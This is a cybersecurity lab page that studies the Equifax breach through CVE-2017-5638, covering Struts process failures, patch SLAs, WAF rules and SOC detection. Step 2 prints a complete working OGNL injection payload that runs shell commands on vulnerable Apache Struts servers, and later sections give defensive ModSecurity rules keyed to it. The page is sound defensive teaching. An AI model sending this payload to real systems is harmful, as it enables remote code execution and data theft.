# Lab 6.10: Case Study. Equifax Breach (CVE-2017-5638)

<div class="lab-meta">
  <span>~35 minutes</span>
  <span>Intermediate</span>
  <span>Prerequisites: <a href="../../tier-1/1.1-dependency-resolution/">Lab 1.1</a></span>

On March 7, 2017, the Apache Software Foundation released Apache Struts 2.3.32 and 2.5.10.1, patching CVE-2017-5638. a critical remote code execution vulnerability in the Jakarta Multipart parser. Within 24 hours, exploit code was publicly available. Within 48 hours, the US-CERT issued an alert. Equifax's internal vulnerability scanner identified the vulnerable Apache Struts installation on their consumer dispute portal on March 15, 2017.

The patch was not applied.

On May 13, 2017, attackers exploited the unpatched vulnerability. They maintained access for **78 days**, exfiltrating the personal data of **147 million people**. names, Social Security numbers, birth dates, addresses, and in some cases driver's license numbers and credit card numbers. Equifax discovered the breach on July 29, 2017, and publicly disclosed it on September 7, 2017.

The Equifax breach is not a story about a sophisticated attack. The exploit was public. The patch existed. The scanner found it. This is a story about **dependency management failure**. knowing you have a vulnerability and failing to remediate it. The resulting $700 million settlement, congressional hearings, and the resignation of the CEO, CIO, and CISO make it the most consequential example of what happens when patching processes fail.

In this lab, you will study the CVE-2017-5638 attack mechanism, trace the process failures that enabled the breach, and build the dependency management controls that would have prevented it.

### Step 1: What is Apache Struts?

```bash
cat /app/analysis/what-is-struts.txt
```

Apache Struts is a Java web application framework for building enterprise web applications. It was (and in many legacy environments still is) a standard framework for building Java web portals. Equifax used it for their consumer dispute portal. the website where consumers could dispute information on their credit reports.

In 2017, Apache Struts was used by:
- 65% of Fortune 100 companies
- Government agencies
- Financial institutions
- Healthcare organizations

### Step 2: The vulnerability. CVE-2017-5638

```bash
cat /app/analysis/cve-2017-5638-detail.txt
```

CVE-2017-5638 is a **remote code execution** vulnerability in the Jakarta Multipart parser used by Apache Struts 2.3.5 through 2.3.31 and 2.5 through 2.5.10. When the Content-Type header of an HTTP request is malformed during a file upload, Struts throws an exception. The exception handling code **evaluates OGNL expressions** (Object-Graph Navigation Language) embedded in the Content-Type header.

The attack is a single HTTP request:

```http
POST /dispute HTTP/1.1
Host: disputes.equifax.com
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

This single request gives the attacker full shell access to the web server. No authentication required. No special tools needed.

### Step 3: Examine the vulnerable dependency

```bash
cat /app/pom.xml
```

The `pom.xml` shows `struts2-core:2.3.31` as a direct dependency. Unlike Log4Shell (where Log4j was hidden as a transitive dependency), Struts was a **direct, visible dependency**. It was listed right there in the `pom.xml`. The version number was right there. The CVE was a perfect match. There was no excuse for not knowing.

### Step 4: Why the patch was not applied

```bash
cat /app/analysis/process-failures.txt
```

The US House Committee on Oversight investigation identified these specific failures:

1. **Email notification sent, not tracked**: The security team sent an email to a distribution list about CVE-2017-5638. Nobody confirmed receipt. Nobody tracked remediation.

2. **No ownership mapping**: The email told people to patch Struts. But nobody mapped which applications used Struts to which teams owned those applications.

3. **Scanner found it, nobody acted**: The March 15 scan identified the vulnerability. The scan result went into a queue. Nobody was assigned to remediate it. No SLA was enforced.

4. **No verification loop**: Nobody checked whether the patch was actually applied after the notification was sent.

5. **Expired SSL certificate on inspection tool**: Equifax had a network traffic inspection device that could have detected the data exfiltration. Its SSL certificate had been expired for **19 months**. Encrypted traffic passed through uninspected.

6. **No network segmentation**: The dispute portal server had direct access to backend databases containing the full consumer records. Once the web server was compromised, the attacker could query the database directly.

???+ warning "Phase 2: ANALYZE. The Attack Mechanism and 78-Day Breach"

    **Goal:** Walk through the technical exploitation of CVE-2017-5638 and understand how the attackers operated undetected for 78 days.

### Step 1: OGNL injection via Content-Type

Apache Struts uses OGNL (Object-Graph Navigation Language) as an expression language throughout its framework. When the Jakarta Multipart parser encounters a malformed Content-Type header, it constructs an error message that includes the Content-Type value. This error message is processed through OGNL evaluation. which means arbitrary OGNL expressions in the Content-Type header are executed as code.

```bash
echo "
Normal request:
  Content-Type: multipart/form-data
  → Parser processes the upload normally

Malformed request (before patch):
  Content-Type: %{ognl_expression_here}
  → Parser throws exception
  → Exception message includes the Content-Type value
  → OGNL evaluates the expression in the error message
  → Arbitrary code execution
"
```

The OGNL expression in the exploit payload:
1. Overrides Struts' security restrictions (`DEFAULT_MEMBER_ACCESS`)
2. Clears the excluded packages list (bypasses sandbox)
3. Creates a `ProcessBuilder` to run arbitrary shell commands
4. Pipes the command output back through the HTTP response

### Step 2: What the attackers did

```bash
cat /app/analysis/attack-reconstruction.txt
```

Based on the forensic investigation:

1. **Initial access (May 13)**: Exploited CVE-2017-5638 on the dispute portal to get shell access on the web server.

2. **Credential theft**: Found database credentials in configuration files on the web server. Equifax stored database passwords in plaintext in application configuration.

3. **Lateral movement**: Used the database credentials to query backend systems. The web server had unrestricted network access to database servers.

4. **Data exfiltration (May 13 - July 29)**: Ran approximately **9,000 database queries** over 78 days, exfiltrating personal records in small batches to avoid triggering volume-based alerts.

5. **Encryption and exfiltration**: Encrypted the stolen data and exfiltrated it through web shells and normal HTTPS traffic. Because the SSL inspection device had an expired certificate, the encrypted exfiltration traffic was never inspected.

    **Goal:** Extract the patching and dependency management lessons from the Equifax breach and implement controls that prevent remediation failures.

### Lesson 1: Patching SLAs are critical

```bash
cat /app/patch-compliance-checklist.md
```

The checklist defines:
- **Critical CVEs (CVSS 9.0-10.0)**: 48-hour SLA with CISO escalation at 24 hours
- **High CVEs (CVSS 7.0-8.9)**: 7-day SLA with manager escalation at 5 days
- **Medium CVEs**: 30-day SLA
- **Low CVEs**: 90-day SLA

CVE-2017-5638 had a CVSS score of 10.0. Under this framework, the patch would have been required within 48 hours with CISO notification at 24 hours if not applied.

### Lesson 2: Knowing your dependencies is not enough

```bash
echo "
Equifax KNEW they were running vulnerable Struts:
  - US-CERT alert was received
  - Internal email notification was sent
  - Vulnerability scanner found it on March 15

What was MISSING:
  - An owner assigned to the remediation ticket
  - An SLA with automated escalation
  - A verification step to confirm the patch was applied
  - A compensating control (WAF rule) while waiting for the patch

SBOM is necessary but not sufficient.
You need: SBOM + patch process + SLA + verification + escalation
"
```

### Lesson 3: Vulnerability scanning without remediation workflow is theater

```bash
echo "
Equifax's scanning was working perfectly:
  - Scans ran on schedule
  - Vulnerabilities were identified correctly
  - Reports were generated

But scanning without action is just documentation of your risk.
It is vulnerability theater -- the appearance of security.

A complete vulnerability management program requires:

1. SCAN:     Identify vulnerabilities (Equifax did this)
2. TICKET:   Auto-create remediation tickets (Equifax did not)
3. ASSIGN:   Route to the component owner (Equifax did not)
4. TRACK:    SLA clock starts, progress monitored (Equifax did not)
5. PATCH:    Apply the fix (Equifax did not)
6. VERIFY:   Rescan to confirm remediation (Equifax did not)
7. ESCALATE: Auto-escalate if SLA breached (Equifax did not)
"
```

### Lesson 4: Compensating controls buy time

```bash
# Create WAF rules as a compensating control
cat > /app/waf-rules.conf << 'WAFEOF'
# ModSecurity rules for CVE-2017-5638 (Apache Struts Content-Type RCE)
# Deploy IMMEDIATELY when a Struts CVE is published, even before patching.
# FOR EDUCATIONAL PURPOSES -- WeakLink Labs training material

# Rule 1: Block OGNL expressions in Content-Type header
SecRule REQUEST_HEADERS:Content-Type "@rx (%\{|#_memberAccess|@ognl)" \
    "id:2001,phase:1,deny,status:403,log,\
    msg:'Struts RCE: OGNL expression in Content-Type header',\
    tag:'CVE-2017-5638',severity:'CRITICAL'"

# Rule 2: Block ProcessBuilder in Content-Type (command execution)
SecRule REQUEST_HEADERS:Content-Type "@rx (ProcessBuilder|Runtime\.getRuntime|getOutputStream)" \
    "id:2002,phase:1,deny,status:403,log,\
    msg:'Struts RCE: Command execution in Content-Type header',\
    tag:'CVE-2017-5638',severity:'CRITICAL'"

# Rule 3: Block multipart Content-Type with OGNL markers
SecRule REQUEST_HEADERS:Content-Type "@rx multipart" \
    "chain,id:2003,phase:1,deny,status:403,log,\
    msg:'Struts RCE: Multipart with OGNL payload detected',\
    tag:'CVE-2017-5638',severity:'CRITICAL'"
  SecRule REQUEST_HEADERS:Content-Type "@rx (#dm=|#cmd=|#context)" ""

# Rule 4: Block common Struts exploit patterns
SecRule REQUEST_HEADERS:Content-Type "@rx (com\.opensymphony|xwork2|ActionContext|ServletActionContext)" \
    "id:2004,phase:1,deny,status:403,log,\
    msg:'Struts RCE: Struts internal class reference in Content-Type',\
    tag:'CVE-2017-5638',severity:'CRITICAL'"
WAFEOF
```

If Equifax had deployed WAF rules on March 8 (the day after the patch release), the exploit attempts starting May 13 would have been blocked. buying time to complete the patching process.

??? danger "Phase 4: DETECT. Identifying Struts Exploitation and Unpatched Instances"

    **Goal:** Detect both active Struts exploitation and the presence of unpatched Struts instances in your environment.

### SIEM / Log Indicators

Struts exploitation via CVE-2017-5638 produces clear network signatures: **OGNL expressions in Content-Type headers** and **command execution output in HTTP responses**. The post-exploitation activity (database queries, data exfiltration) produces volume-based and timing-based anomalies.

**What to look for:**

- HTTP requests with OGNL expressions in the Content-Type header
- HTTP responses containing command output (e.g., system usernames, directory listings)
- Web servers making unusual database queries (volume or pattern change)
- Large data transfers from web servers to external destinations
- New processes spawned by the Java/Tomcat process

### Patch Compliance Detection

Beyond exploitation detection, monitor for **unpatched Struts instances**:

### EDR / Process Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| Java/Tomcat spawning `sh`, `bash`, `cmd.exe` | Process | Post-exploitation command execution |
| OGNL keywords in HTTP Content-Type header | Network | CVE-2017-5638 exploit attempt |
| Web server process querying database at unusual rate | Database | Data exfiltration phase |
| Large outbound transfers from DMZ to internet | Network | Exfiltration of stolen data |
| New web shell files in Struts application directory | File | Persistence after initial exploitation |

### MITRE ATT&CK Mapping

| Technique | ID | Relevance |
|-----------|-----|-----------|
| **Exploit Public-Facing Application** | [T1190](https://attack.mitre.org/techniques/T1190/) | RCE via malformed Content-Type header on internet-facing dispute portal |
| **Supply Chain Compromise: Software Supply Chain** | [T1195.002](https://attack.mitre.org/techniques/T1195/002/) | Failure to patch a known vulnerability in a third-party web framework dependency |

??? tip "SOC Relevance"

    **Alerts you will see:**

    - "OGNL expression in Content-Type header" (WAF/IDS)
    - "Java process spawned shell command" (EDR)
    - "Anomalous database query volume from web server" (SIEM)
    - "Unpatched CVE-2017-5638 detected in scan" (vulnerability management)
    - "Large outbound data transfer from DMZ" (DLP/network monitoring)

    **Why this matters to your SOC:** The Equifax breach is the canonical example of a preventable supply chain security failure. The SOC's role extends beyond detecting exploitation. it includes monitoring **patch compliance**. If your SOC tracks vulnerability scan results and alerts when critical CVEs remain unpatched past SLA, the Equifax scenario cannot happen. The breach was detected 78 days after initial exploitation. meaning the network monitoring, database monitoring, and data loss prevention controls all failed or were not properly configured.

    **Triage workflow:**

    1. **Check for active exploitation**. is the CVE-2017-5638 signature firing? Inspect the Content-Type header for OGNL expressions.
    2. **Identify all Struts instances**. query your asset inventory and vulnerability scan results for Apache Struts installations.
    3. **Check patch status**. are the Struts instances on version 2.3.32+ or 2.5.10.1+? If not, they are vulnerable.
    4. **If unpatched: deploy compensating controls immediately**. WAF rules to block OGNL in Content-Type, restrict database access from web servers, enable enhanced logging.
    5. **If exploitation confirmed**. full incident response: isolate affected servers, check for web shells, audit database query logs for data access, check for data exfiltration.
    6. **Patch and verify**. apply the Struts update, verify with a rescan, remove compensating controls only after verification.

    **False positive rate:** Very low. OGNL expressions in Content-Type headers are never legitimate. Database query volume anomalies may have legitimate causes (batch jobs, reporting), but should always be investigated when correlated with an unpatched Struts installation.

## What You Learned

1. **The Equifax breach was entirely preventable**. the patch existed for two months before the exploitation. The scanner found the vulnerability. The process to apply the patch failed.
2. **Vulnerability scanning without remediation workflow is security theater**. Equifax scanned, found the CVE, sent an email, and nobody followed up. Scanning must be connected to ticketing, assignment, SLAs, and verification.
3. **Patching SLAs with automated escalation are essential**. a critical CVE (CVSS 10.0) should trigger a 48-hour remediation window with escalation to CISO if the deadline is missed.
4. **Compensating controls buy time**. WAF rules to block OGNL injection could have been deployed within hours of the CVE announcement, blocking exploitation while the patch was being tested.
5. **Network segmentation limits blast radius**. the dispute portal web server should not have had direct access to the full consumer database. Segmentation would have limited the breach scope.
6. **Expired certificates and monitoring gaps compound failures**. Equifax's SSL inspection device had an expired certificate for 19 months, rendering encrypted traffic inspection useless during the breach.
7. **The cost of not patching dwarfs the cost of patching**. approximately 40 hours of engineering time to apply a patch vs. $700 million in settlements plus $1.4 billion in total remediation costs.
